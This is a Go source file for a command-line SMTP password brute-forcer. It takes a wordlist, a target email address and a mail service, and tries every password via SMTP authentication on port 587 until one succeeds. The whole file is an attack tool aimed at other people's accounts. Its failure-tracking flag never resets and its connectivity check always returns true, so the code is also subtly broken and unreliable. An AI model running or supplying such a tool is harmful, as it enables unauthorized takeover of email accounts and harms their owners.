package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/smtp"
	"os"
	"strings"
)

var (
	Wordlist = flag.String("list", "dnsmap.txt", "")
	Email    = flag.String("email", "", "")
	Service  = flag.String("service", "", "")
	rev      = "\033[0;39m"
	reb      = "\033[49m"
	blk      = "\033[0;30m"
	red      = "\033[0;31m"
	grn      = "\033[0;32m"
	yel      = "\033[0;33m"
	blu      = "\033[0;34m"
	mag      = "\033[0;35m"
	cyn      = "\033[0;36m"
	wht      = "\033[0;37m"
	blkb     = "\033[40m"
	redb     = "\033[41m"
	grnb     = "\033[42m"
	yelb     = "\033[43m"
	blub     = "\033[44m"
	magb     = "\033[45m"
	cynb     = "\033[46m"
	whtb     = "\033[47m"
	res      bool
	counter  uint
)

func ce(err error) bool {
	if err != nil {
		log.Fatal(err)
		return true
	} else {
		return false
	}
}

func Read(filepath string) []string {
	dat, err := ioutil.ReadFile(filepath)
	ce(err)
	return strings.Split(string(dat), "\n")
}

func Denied(err error) bool {
	if err != nil {
		res = true
	}
	return res
}

func is_online(url string) bool {
	contact, err := http.Get(url)
	if err != nil {
		fmt.Println(wht + "[" + redb + "ERROR" + rev + reb + wht + "]" + blu + " GET: GET REQUEST FAILED, OFFLINE! ")
		return true
	} else {
		if contact.StatusCode >= 100 {
			fmt.Println(wht + "[" + redb + "DATA" + rev + reb + wht + "]" + blu + " GET: GET REQUEST PASSED, USER ONLINE!")
			return true
		}
	}
	return true
}

func info(filename string) {
	fstat, err := os.Stat(filename)
	ce(err)
	fmt.Println("Wordlist            |=> ", *Wordlist)
	fmt.Println("Target Email        |=> ", *Email)
	fmt.Println("Target Service      |=> ", *Service)
	fmt.Println("File Name           |=> ", fstat.Name())
	fmt.Println("File Size           |=> ", fstat.Size())
	fmt.Println("File Permissions    |=> ", fstat.Mode())
	fmt.Println("Last Modified       |=> ", fstat.ModTime())
	fmt.Println("Is Dir              |=> ", fstat.IsDir())
}

func Brute(Wordlist, Email string) {
	fmt.Print("\n")
	fmt.Println("___MSG____PASSWORD____ATTEMPT_________________________")
	passwdlist := Read(Wordlist)
	mail := []string{Email}
	for _, try := range passwdlist {
		auth := smtp.PlainAuth("", Email, try, *Service)
		err := smtp.SendMail(fmt.Sprintf("%s:%d", *Service, 587),
			auth,
			Email,
			mail,
			[]byte("message"))
		if Denied(err) {
			counter += 1
			fmt.Println(wht+"["+redb+"ERROR"+rev+reb+wht+"]"+wht+"    ["+yelb+try+wht+"] "+rev+reb+red+"    -> AUTH FAILED | ATTEMPT => #", counter)

		} else {
			fmt.Println(wht+"["+grnb+"AUTH"+rev+reb+wht+"]"+wht+" -> PASSWORD FOUND! -> ", try)
			os.Exit(0)
		}
	}
}
func main() {
	flag.Parse()
	is_online("https://www.google.com")
	info(*Wordlist)
	Brute(*Wordlist, *Email)
}
